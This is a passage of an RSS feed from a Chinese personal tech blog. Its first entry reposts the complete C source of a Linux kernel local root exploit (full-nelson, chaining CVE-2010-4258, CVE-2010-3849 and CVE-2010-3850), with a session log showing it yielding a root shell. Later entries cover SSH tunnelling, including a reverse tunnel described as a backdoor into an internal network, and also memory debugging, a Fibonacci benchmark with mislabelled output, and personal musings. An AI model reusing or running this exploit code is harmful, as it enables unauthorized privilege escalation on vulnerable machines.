<![CDATA[ECONET协议的漏洞，可以获得root权限，在Ubuntu10.04上测试失败，在Ubuntu11.04上测试成功，好像要2.6.32以上版本的内核下才能用。<br>hankjin@ysmonk:~$ gcc econ.c<br>hankjin@ysmonk:~$ uname -r<br>2.6.37-7-generic<br>hankjin@ysmonk:~$ ./a.out<br>[*] Resolving kernel addresses...<br>&nbsp;[+] Resolved econet_ioctl to 0xf82fce10<br>&nbsp;[+] Resolved econet_ops to 0xf82fd3a0<br>&nbsp;[+] Resolved commit_creds to 0xc01749d0<br>&nbsp;[+] Resolved prepare_kernel_cred to 0xc0174c40<br>[*] Calculating target...<br>[*] Failed to set Econet address.<br>[*] Triggering payload...<br>[*] Got root!<br># whoami<br>root<br># <br><br>/*<br>&nbsp;* Linux Kernel &lt;= 2.6.37 local privilege escalation<br>&nbsp;* by Dan Rosenberg<br>&nbsp;* @djrbliss on twitter<br>&nbsp;*<br>&nbsp;* Usage:<br>&nbsp;* gcc full-nelson.c -o full-nelson<br>&nbsp;* ./full-nelson<br>&nbsp;*<br>&nbsp;* This exploit leverages three vulnerabilities to get root, all of which were<br>&nbsp;* discovered by Nelson Elhage:<br>&nbsp;*<br>&nbsp;* CVE-2010-4258<br>&nbsp;* -------------<br>&nbsp;* This is the interesting one, and the reason I wrote this exploit.&nbsp; If a<br>&nbsp;* thread is created via clone(2) using the CLONE_CHILD_CLEARTID flag, a NULL<br>&nbsp;* word will be written to a user-specified pointer when that thread exits.<br>&nbsp;* This write is done using put_user(), which ensures the provided destination<br>&nbsp;* resides in valid userspace by invoking access_ok().&nbsp; However, Nelson<br>&nbsp;* discovered that when the kernel performs an address limit override via<br>&nbsp;* set_fs(KERNEL_DS) and the thread subsequently OOPSes (via BUG, page fault,<br>&nbsp;* etc.), this override is not reverted before calling put_user() in the exit<br>&nbsp;* path, allowing a user to write a NULL word to an arbitrary kernel address.<br>&nbsp;* Note that this issue requires an additional vulnerability to trigger.<br>&nbsp;*<br>&nbsp;* CVE-2010-3849<br>&nbsp;* -------------<br>&nbsp;* This is a NULL pointer dereference in the Econet protocol.&nbsp; By itself, it's<br>&nbsp;* fairly benign as a local denial-of-service.&nbsp; It's a perfect candidate to<br>&nbsp;* trigger the above issue, since it's reachable via sock_no_sendpage(), which<br>&nbsp;* subsequently calls sendmsg under KERNEL_DS.<br>&nbsp;*<br>&nbsp;* CVE-2010-3850<br>&nbsp;* -------------<br>&nbsp;* I wouldn't be able to reach the NULL pointer dereference and trigger the<br>&nbsp;* OOPS if users weren't able to assign Econet addresses to arbitrary<br>&nbsp;* interfaces due to a missing capabilities check.<br>&nbsp;*<br>&nbsp;* In the interest of public safety, this exploit was specifically designed to<br>&nbsp;* be limited:<br>&nbsp;*<br>&nbsp;*&nbsp; * The particular symbols I resolve are not exported on Slackware or Debian<br>&nbsp;*&nbsp; * Red Hat does not support Econet by default<br>&nbsp;*&nbsp; * CVE-2010-3849 and CVE-2010-3850 have both been patched by Ubuntu and<br>&nbsp;*&nbsp;&nbsp;&nbsp; Debian<br>&nbsp;*<br>&nbsp;* However, the important issue, CVE-2010-4258, affects everyone, and it would<br>&nbsp;* be trivial to find an unpatched DoS under KERNEL_DS and write a slightly<br>&nbsp;* more sophisticated version of this that doesn't have the roadblocks I put in<br>&nbsp;* to prevent abuse by script kiddies.<br>&nbsp;*<br>&nbsp;* Tested on unpatched Ubuntu 10.04 kernels, both x86 and x86-64.<br>&nbsp;*<br>&nbsp;* NOTE: the exploit process will deadlock and stay in a zombie state after you<br>&nbsp;* exit your root shell because the Econet thread OOPSes while holding the<br>&nbsp;* Econet mutex.&nbsp; It wouldn't be too hard to fix this up, but I didn't bother.<br>&nbsp;*<br>&nbsp;* Greets to spender, taviso, stealth, pipacs, jono, kees, and bla<br>&nbsp;*/<br><br>#include &lt;stdio.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;sys/ioctl.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;net/if.h&gt;<br>#include &lt;sched.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;signal.h&gt;<br>#include &lt;sys/utsname.h&gt;<br>#include &lt;sys/mman.h&gt;<br>#include &lt;unistd.h&gt;<br><br>/* How many bytes should we clear in our<br>&nbsp;* function pointer to put it into userspace? */<br>#ifdef __x86_64__<br>#define SHIFT 24<br>#define OFFSET 3<br>#else<br>#define SHIFT 8<br>#define OFFSET 1<br>#endif<br><br>/* thanks spender... */<br>unsigned long get_kernel_sym(char *name)<br>{<br>&nbsp;&nbsp;&nbsp; FILE *f;<br>&nbsp;&nbsp;&nbsp; unsigned long addr;<br>&nbsp;&nbsp;&nbsp; char dummy;<br>&nbsp;&nbsp;&nbsp; char sname[512];<br>&nbsp;&nbsp;&nbsp; struct utsname ver;<br>&nbsp;&nbsp;&nbsp; int ret;<br>&nbsp;&nbsp;&nbsp; int rep = 0;<br>&nbsp;&nbsp;&nbsp; int oldstyle = 0;<br><br>&nbsp;&nbsp;&nbsp; f = fopen("/proc/kallsyms", "r");<br>&nbsp;&nbsp;&nbsp; if (f == NULL) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; f = fopen("/proc/ksyms", "r");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (f == NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; goto fallback;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oldstyle = 1;<br>&nbsp;&nbsp;&nbsp; }<br><br>repeat:<br>&nbsp;&nbsp;&nbsp; ret = 0;<br>&nbsp;&nbsp;&nbsp; while(ret != EOF) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (!oldstyle)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ret = fscanf(f, "%p %c %s\n", (void **)&amp;addr, &amp;dummy, sname);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ret = fscanf(f, "%p %s\n", (void **)&amp;addr, sname);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (ret == 2) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char *p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (strstr(sname, "_O/") || strstr(sname, "_S."))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p = strrchr(sname, '_');<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (p &gt; ((char *)sname + 5) &amp;&amp; !strncmp(p - 3, "smp", 3)) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p = p - 4;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; while (p &gt; (char *)sname &amp;&amp; *(p - 1) == '_')<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p--;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; *p = '\0';<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (ret == 0) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fscanf(f, "%s\n", sname);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (!strcmp(name, sname)) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fclose(f);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return addr;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; fclose(f);<br>&nbsp;&nbsp;&nbsp; if (rep)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return 0;<br>fallback:<br>&nbsp;&nbsp;&nbsp; uname(&amp;ver);<br>&nbsp;&nbsp;&nbsp; if (strncmp(ver.release, "2.6", 3))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oldstyle = 1;<br>&nbsp;&nbsp;&nbsp; sprintf(sname, "/boot/System.map-%s", ver.release);<br>&nbsp;&nbsp;&nbsp; f = fopen(sname, "r");<br>&nbsp;&nbsp;&nbsp; if (f == NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return 0;<br>&nbsp;&nbsp;&nbsp; rep = 1;<br>&nbsp;&nbsp;&nbsp; goto repeat;<br>}<br><br>typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);<br>typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);<br>_commit_creds commit_creds;<br>_prepare_kernel_cred prepare_kernel_cred;<br><br>static int __attribute__((regparm(3)))<br>getroot(void * file, void * vma)<br>{<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commit_creds(prepare_kernel_cred(0));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;<br><br>}<br><br>/* Why do I do this?&nbsp; Because on x86-64, the address of<br>&nbsp;* commit_creds and prepare_kernel_cred are loaded relative<br>&nbsp;* to rip, which means I can't just copy the above payload<br>&nbsp;* into my landing area. */<br>void __attribute__((regparm(3)))<br>trampoline()<br>{<br><br>#ifdef __x86_64__<br>&nbsp;&nbsp;&nbsp; asm("mov $getroot, %rax; call *%rax;");<br>#else<br>&nbsp;&nbsp;&nbsp; asm("mov $getroot, %eax; call *%eax;");<br>#endif<br><br>}<br><br>/* Triggers a NULL pointer dereference in econet_sendmsg<br>&nbsp;* via sock_no_sendpage, so it's under KERNEL_DS */<br>int trigger(int * fildes)<br>{<br>&nbsp;&nbsp;&nbsp; int ret;<br>&nbsp;&nbsp;&nbsp; struct ifreq ifr;<br><br>&nbsp;&nbsp;&nbsp; memset(&amp;ifr, 0, sizeof(ifr));<br>&nbsp;&nbsp;&nbsp; strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);<br><br>&nbsp;&nbsp;&nbsp; ret = ioctl(fildes[2], SIOCSIFADDR, &amp;ifr);<br><br>&nbsp;&nbsp;&nbsp; if(ret &lt; 0) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Failed to set Econet address.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; splice(fildes[3], NULL, fildes[1], NULL, 128, 0);<br>&nbsp;&nbsp;&nbsp; splice(fildes[0], NULL, fildes[2], NULL, 128, 0);<br><br>&nbsp;&nbsp;&nbsp; /* Shouldn't get here... */<br>&nbsp;&nbsp;&nbsp; exit(0);<br>}<br><br>int main(int argc, char * argv[])<br>{<br>&nbsp;&nbsp;&nbsp; unsigned long econet_ops, econet_ioctl, target, landing;<br>&nbsp;&nbsp;&nbsp; int fildes[4], pid;<br>&nbsp;&nbsp;&nbsp; void * newstack, * payload;<br><br>&nbsp;&nbsp;&nbsp; /* Create file descriptors now so there are two<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; references to them after cloning...otherwise<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; the child will never return because it<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; deadlocks when trying to unlock various<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; mutexes after OOPSing */<br>&nbsp;&nbsp;&nbsp; pipe(fildes);<br>&nbsp;&nbsp;&nbsp; fildes[2] = socket(PF_ECONET, SOCK_DGRAM, 0);<br>&nbsp;&nbsp;&nbsp; fildes[3] = open("/dev/zero", O_RDONLY);<br><br>&nbsp;&nbsp;&nbsp; if(fildes[0]&lt; 0 || fildes[1] &lt; 0 || fildes[2] &lt; 0 || fildes[3] &lt; 0) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Failed to open file descriptors.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; /* Resolve addresses of relevant symbols */<br>&nbsp;&nbsp;&nbsp; printf("[*] Resolving kernel addresses...\n");<br>&nbsp;&nbsp;&nbsp; econet_ioctl = get_kernel_sym("econet_ioctl");<br>&nbsp;&nbsp;&nbsp; econet_ops = get_kernel_sym("econet_ops");<br>&nbsp;&nbsp;&nbsp; commit_creds = (_commit_creds) get_kernel_sym("commit_creds");<br>&nbsp;&nbsp;&nbsp; prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");<br><br>&nbsp;&nbsp;&nbsp; if(!econet_ioctl || !commit_creds || !prepare_kernel_cred || !econet_ops) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Failed to resolve kernel symbols.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; if(!(newstack = malloc(65536))) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Failed to allocate memory.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; printf("[*] Calculating target...\n");<br>&nbsp;&nbsp;&nbsp; target = econet_ops + 10 * sizeof(void *) - OFFSET;<br><br>&nbsp;&nbsp;&nbsp; /* Clear the higher bits */<br>&nbsp;&nbsp;&nbsp; landing = econet_ioctl &lt;&lt; SHIFT &gt;&gt; SHIFT;<br><br>&nbsp;&nbsp;&nbsp; payload = mmap((void *)(landing &amp; ~0xfff), 2 * 4096,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PROT_READ | PROT_WRITE | PROT_EXEC,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);<br><br>&nbsp;&nbsp;&nbsp; if ((long)payload == -1) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Failed to mmap() at target address.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; memcpy((void *)landing, &amp;trampoline, 1024);<br><br>&nbsp;&nbsp;&nbsp; clone((int (*)(void *))trigger,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void *)((unsigned long)newstack + 65536),<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;fildes, NULL, NULL, target);<br><br>&nbsp;&nbsp;&nbsp; sleep(1);<br><br>&nbsp;&nbsp;&nbsp; printf("[*] Triggering payload...\n");<br>&nbsp;&nbsp;&nbsp; ioctl(fildes[2], 0, NULL);<br><br>&nbsp;&nbsp;&nbsp; if(getuid()) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("[*] Exploit failed to get root.\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; printf("[*] Got root!\n");<br>&nbsp;&nbsp;&nbsp; execl("/bin/sh", "/bin/sh", NULL);<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111010463570/</guid>
    </item>
    <item>
      <title>
<![CDATA[ssh隧道]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201052175856395/</link>
      <description>
<![CDATA[名字起得太好了<br>ssh三种通道，1. 本地，2，远程，3，动态<br>1.本地<br>ssh -NfL port:destIP:destPort 从本地打一个洞，直接到远端<br>例如 ssh -NfL 1234:www.google.com:80<br>然后 wget localhost:1234 就相当于wget www.google.com:80<br>用法：有一个你不能访问的网站，但你的朋友可以访问，而你可以访问你朋友的网站，<br>然后让你的朋友打一个去网站的洞，你就可以将上面的localhost换成你朋友的IP，就可以用上这个隧道了。<br><br>2. 远程，这个需要拥有远程电脑帐户<br>ssh -NfR port:localIP:localPort user@remoteIP 从远程打一个洞，直接到本地<br>例如 ssh -NfR 1234:localhost:22 hankjin@212.67.28.178<br>然后ssh -p 1234 211.67.28.178，就相当于ssh localhost了<br>用法：如果你的电脑在内网，你想从外网访问，就可以先在你电脑上用这个命令打个后门，然后就可以从外网进去了<br><br>3. 动态，这个也要远程电脑帐户<br>ssh -NfD port&nbsp; user@remoteIP<br>例如 ssh -NfD 1234 hankjin@212.67.28.178<br>然后在浏览器上设置SOCKET5代理为localhost 1234，212.67.28.178就是你的代理服务器了，翻墙就是这么简单。<br><br>最后看一下这些参数<br>-N表示不执行命令<br>-f表示后台执行，也可以不用f，在命令的最后加一个 &amp;，让它去后台执行<br>-L Local<br>-R Remote<br>-D Dynamic]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201052175856395/</guid>
    </item>
    <item>
      <title>
<![CDATA[pmap运行中进程的内存泄露]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201172485553775/</link>
      <description>
<![CDATA[pmap &lt;pid&gt;<br>pmap -d &lt;pid&gt;<br>其中的10240是线程的堆栈，pmap &lt;pid&gt;|grep 10240|wc 应该和线程数一致，如果不一致，可能是有线程异常退出、或有线程退出时没有释放资源，或者有线程没启动。<br><br>找到可疑的内存块后，可以用gdb -p挂上进程，然后x/40a 0xaddr查看对应内存的数据]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201172485553775/</guid>
    </item>
    <item>
      <title>
<![CDATA[博客访问量异常]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092994839447/</link>
      <description>
<![CDATA[谷歌退出前，访问量一直在100～200之间，大部分访问来自谷歌搜索<br>然后谷歌退出，访问量下降到不到100，大部分访问来自百度搜索；<br>然后访问量慢慢回升，逐渐稳定到100左右<br>近两天，访问量突然上长，昨天264，今天还不到10点钟，访问量已经110了，奇迹？黑幕？<br><br>也许若干年后，专职写技术博客，也未尝不是一种不错的生活方式]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092994839447/</guid>
    </item>
    <item>
      <title>
<![CDATA[798艺术区随想]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372012020375614/</link>
      <description>
<![CDATA[&nbsp;&nbsp;&nbsp; 祭祀之类的大事举行前, 都要焚香斋戒, 沐浴更衣, 使得身心平和, 否则突然心情烦躁, 冒出一句TMD之类, 不只大煞风景, 恐怕会大杀九族了.<br>&nbsp;&nbsp;&nbsp; 游玩不须斋戒沐浴, 但也要有好心情, 否则金山银山尽是阿堵之物, 焦尾绕梁不过朽木废柴. 谈什么高山流水, 神通先贤, 只落个乘兴而去, 败兴而归.<br>&nbsp;&nbsp;&nbsp; 798艺术区号称后现代艺术的高地, 首先个人完全不懂后现代艺术, 好读书不求甚解, 每有所得, 便欣然自得, 不懂也不妨看热闹, 看完有自己的得就满足了, 元旦小逛了两个小时, 心不在焉, 恍恍然无所得, 记之, 下次整理心情再去.]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372012020375614/</guid>
    </item>
    <item>
      <title>
<![CDATA[快速计算fibonacci数列]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201096101830233/</link>
      <description>
<![CDATA[Fibonacci数列是一个很常见的数列，定义很简单<br>Fib(0) = 1<br>Fib(1) = 1<br>Fib(n) = Fib(n-1) + Fib(n-2)<br>常见的计算方法主要有两种：递归和循环。<br>其中递归的方法最容易理解，但复杂度高。可以用备忘录的方式解决重复计算，从而取得更好的结果<br>第二种办法的循环，从小到大算起，fib(2)=fib(0)+fib(1), fib(3)=fib(2)+fib(1)... fib(n)=fib(n-1)+fib(n-2)，只要O(n)的复杂度，是一种很另人满意的算法。<br>但是在编程珠玑上看到了第三种方法：矩阵相乘<br>Fib(i+2) = Fib(i+1) + Fib(i)<br>[Fib(i+2), Fib(i+1)] = [Fib(i+1)+Fib(i), Fib(i+1)] = [Fib(i+1)*1+Fib(i)*1, Fib(i+1)*1+Fib(i)*0]<br>=[Fib(i+1), Fib(i)] * [1, 1]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1, 0]<br>设A=[1,1]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1,0]<br>则 [Fib(n), Fib(n-1)] = [Fib(n-1), Fib(n-2)]*A = [Fib(n-2), Fib(n-3)] * A * A<br>=[Fib(1), Fib(0)] * A^(n-1)<br>这个问题就转化成了求A^n的问题，而A^n可以表示成A^(2^i1) * (A^(2^i2)) * (A^(2^i3))的形式，因此复杂度为O(log2N)<br>如A^13 = A^1 * A^4 * A^8<br>使用C++语言对这三种算法进行比较，结果如下所示：<br>Fib1=165580141cost:2sec //递归计算，一轮要2秒<br>Fib2=165580141cost:6sec //循环计算，5000000轮要6秒，复杂度O(n)<br>Fib3=165580141cost:1sec //矩阵乘法，5000000轮要1秒，复杂度O(log2N)<br><br>注，还有第四种方法 Fib(n)={ [( (1+sqrt(5))/2 )^(n+1)]&nbsp; - [( (1-sqrt(5))/2 )^(n+1)]&nbsp; } / sqrt(5)，但是这个公式只对1-9的n有效。。。<br><br>代码如下：<br>#include &lt;iostream&gt;<br>using namespace std;<br><br>typedef long long xint;<br><br>void mul(xint p1[][2], xint p2[][2]){<br>&nbsp;&nbsp;&nbsp; xint tmp[2][2];<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;2;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int j=0;j&lt;2;j++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp[i][j]=p1[i][0]*p2[0][j]+p1[i][1]*p2[1][j];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;2;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int j=0;j&lt;2;j++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p1[i][j]=tmp[i][j];<br>&nbsp;&nbsp;&nbsp; }<br>}<br>xint xfib(int n){<br>&nbsp;&nbsp;&nbsp; if(n&lt;2)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; n-=1;<br>&nbsp;&nbsp;&nbsp; xint tmp[2][2]={{1,1},{1,0}};<br>&nbsp;&nbsp;&nbsp; xint res[2][2]={{1,0},{0,1}};<br>&nbsp;&nbsp;&nbsp; while(n&gt;0){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(n&amp;1&gt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mul(res, tmp);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mul(tmp,tmp);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n/=2;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return res[0][0]+res[1][0];<br>}<br>xint fib2(int n){<br>&nbsp;&nbsp;&nbsp; xint t1=1,t2=1;<br>&nbsp;&nbsp;&nbsp; for(int i=1;i&lt;n;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int t = t1+t2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t1 = t2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t2 = t;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return t2;<br>}<br><br>xint fib(int n){<br>&nbsp;&nbsp;&nbsp; if(n&lt;2)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return fib(n-1)+fib(n-2);<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; int t1,t2,t3,t4;<br>&nbsp;&nbsp;&nbsp; int res1,res2,res3;<br>&nbsp;&nbsp;&nbsp; int n = 40;<br>&nbsp;&nbsp;&nbsp; int ITER=5000000;<br>&nbsp;&nbsp;&nbsp; t1 = time(NULL);<br>&nbsp;&nbsp;&nbsp; res1 = fib(n);<br>&nbsp;&nbsp;&nbsp; t2 = time(NULL);<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;ITER;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res2 = xfib(n);<br>&nbsp;&nbsp;&nbsp; t3 = time(NULL);<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;ITER;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res3 = fib2(n);<br>&nbsp;&nbsp;&nbsp; t4 = time(NULL);<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Fib1="&lt;&lt;res1&lt;&lt;"cost:"&lt;&lt;(t2-t1)&lt;&lt;"sec"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Fib2="&lt;&lt;res2&lt;&lt;"cost:"&lt;&lt;(t3-t2)&lt;&lt;"sec"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Fib3="&lt;&lt;res3&lt;&lt;"cost:"&lt;&lt;(t4-t3)&lt;&lt;"sec"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201096101830233/</guid>
    </item>
    <item>
      <title>
<![CDATA[unix-center的网络]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720094353421861/</link>
      <description>
